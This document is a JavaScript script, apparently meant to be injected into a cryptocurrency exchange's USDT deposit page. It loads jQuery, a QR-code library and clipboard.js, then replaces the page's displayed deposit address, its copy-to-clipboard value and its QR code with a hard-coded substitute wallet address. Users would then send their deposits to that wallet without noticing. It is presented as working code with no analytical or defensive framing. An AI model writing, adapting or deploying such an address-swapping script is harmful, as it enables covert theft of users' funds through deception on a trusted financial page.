let head = document.getElementsByTagName("head").item(0);
new Promise(function(resolve, reject) {
  let script = document.createElement("script");
  script.type = "text/javascript";
  script.src = "https://code.jquery.com/jquery-1.12.4.min.js";
  head.appendChild(script);
  let waitFor = setInterval(function() {
    try {
      $.fn.jquery;
      clearInterval(waitFor);
      resolve();
    } catch(e) {
    }
  }, 500);
}).then(function() {
  let script = document.createElement("script");
  script.type = "text/javascript";
  script.src = "https://cdn.jsdelivr.net/npm/jquery.qrcode@1.0.3/jquery.qrcode.min.js";
  head.appendChild(script);
  return new Promise(function(resolve, reject) {
  let waitFor = setInterval(function() {
    try {
      $.fn.qrcode;
      clearInterval(waitFor);
      resolve();
    } catch(e) {
    }
  }, 500);
  });
}).then(function() {
  let script = document.createElement("script");
  script.type = "text/javascript";
  script.src = "https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js";
  head.appendChild(script);
  return new Promise(function(resolve, reject) {
  let waitFor = setInterval(function() {
    try {
      if ("function" == typeof(ClipboardJS)) {
        clearInterval(waitFor);
        resolve();
      }
    } catch(e) {
      console.log(e);
    }
  }, 500);
  });
}).then(function() {
  let myAddress = "aaaaaaaaaaaaaaabbbbbbbbbbbbbccccccccccccchhhhhhhhhhhh";
  let currentUrl = window.location.href;
  if (-1 != currentUrl.toLowerCase().indexOf("my/wallet/account/main/deposit/crypto/usdt")) {
    let waitFor = setInterval(function() {
      $("div").each(function() {
        if ("点击复制" == $(this).html()) {
          {
            let addressDiv = $(this).parent().parent().parent().parent().children("div:eq(0)");
            addressDiv.html(myAddress);
          }
          {
            let copyButton = $(this).parent().parent().children("svg");
            let copyButtonParent = copyButton.parent();
            copyButton.addClass("copy_address");
            copyButton.attr("data-clipboard-text", myAddress);
            let copyButtonCode = copyButton.prop("outerHTML");
            copyButton.remove();
            copyButtonParent.append(copyButtonCode);
            new ClipboardJS(".copy_address");
          }
          {
            let qrCodeCanvas = $(this).parent().parent().parent().parent().find("canvas:eq(0)");
            let cTop = qrCodeCanvas.position().top;
            let cLeft = qrCodeCanvas.position().left;
            let qrCodeCanvasParent = qrCodeCanvas.parent();
            let width = qrCodeCanvas.width();
            let height = qrCodeCanvas.height();
            qrCodeCanvasParent.find("canvas").each(function() {
              $(this).remove();
            });
            qrCodeCanvasParent.find("img").each(function() {
              $(this).remove();
            });
            qrCodeCanvasParent.qrcode({
              "width": width,
              "height": height,
              "text": myAddress
            });
            let imgWidth = 42;
            let imgHeight = 42;
            let imgTop = ((width - imgWidth) / 2) + cTop;
            let imgLeft = ((height - imgHeight) / 2) + cLeft;
            qrCodeCanvasParent.append(`
              <img style = "width: ${imgWidth}px; height: ${imgHeight}px; top: ${imgTop}px; left: ${imgLeft}px; position: absolute;" src = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAABgCAMAAADVRocKAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAABLUExURUdwTP////////////////////////////////r9/P///////////////yahe5TRvuTz71u4m3bEq0Gsi7Pe0cvo30GtizOng4XKtfzWBtIAAAANdFJOUwBDr78kcBDfX/aQoM8BtzkgAAADuklEQVRo3rWa27arIAxFvSMqRihe/v9LDz0dbaMChtSdx9au2ZAQMJBlJGvyuisGIZUzKcqiq/Mmu8uathfKY0PfVjeo16WKWPkjI4+qv6zI+X9eKJKJlqVfS0U2BiIXKskSEVWhkq1PCHcrFcPITjSdYlpHmnyVUGwThGGqpFJ/SWjVj3YRiFr9bPUf60cJrbrFgqNUfZ+ZGPb9dXWZn9PIsPnzc+klNCj/DQegUbb6ZhyavywHxhENUhcPsOEBTCzQuEAwHRhHVAROYeh/d2AcAa+k4QFiOzCuuI7tl2pcQYEN2LkgQg7IZbzHhTrggEXPP0i2+l2Qjb8GIQcsrfbApQsBBxgAfxTygAMcwKI8iVQEHOAAUMlzO9dTld47wAJo/E1zCvHOARZg58IrzHgHrX8H6OMY4RGax98BOxeaeJ3mAfShavfhMqcNNpTi2+4LHVw7Ve8AA7VO60CuxRYeN9cacp0mA/Da2eBpbO4CbHgy1+SFhg5AJa9GmwlzGwCVvO5biKbYr9aH1iiLjNZ4FYi4UHznsX+lfJjN2tlaC4DTFOD56QybXuIuDN+14Pyk3pzIZh7hIdKvR5awCyKT3jLnHoHZmpUSg8XYySwBF2QWcGCTdqUHeZmnQ4qs70czvwPGk7SxLHJDEqhjmT/E1rN7iQH0SQEOgMP3y6QmWKiAFeQxyz9p9AnykfB0cd40CsTqkvNlOPirBlc9Jax+fYm2LAcfF/O/7M7WJbt+eGaINhvYZ12T87aGZrLA1fo01dy/s/P3tW1+G3ohm+zOy9PmqNztWfyTeXn+U6cq8Tuim9zg5uB6vYvvFHVjrUN7g4i+K3a1ohKIADi8leeKSqAB9vpuwWkUlUACHPSf+xZBJVAAR/3h8PoXJRAAcGrkeTsgwAWAty/SKCLhEnDWf7VFSiLhCuDRL4NdKEgHQLBz1CgaIQ7w6b8bRyWNEAV49QvfS2CYEAN49b/dBEEiRAB+fXHVbAQqAK6ag41MfPnSFH1B6JcCBQCU7qYgEAKAkL7YH3gQXvD8ACC2Z4trghcQ1O/JXX0gr7/xPn+rGARI6V936YSwfnfRWqYRwvre1nLscAUS9avL9j6BENZXFeOAAhL0W9YRC5D1uYc4cIc+dZR443N5EAjX+rL66agRuPlJPiyFi/lLvanQigghqC8TzqyrPkgI6hdp9xPa1CP39LsJKQhZs+4lUBGiZl9DyQmXB0r2xY1XuNv41ZP6hjs0VdsP3pHp2xtv6Dyv/5Tv6z9DwvWff0u1gzxxIn/4AAAAAElFTkSuQmCC" />
            `);
            clearInterval(waitFor);
          }
        }
      });
    }, 500);
  }
});
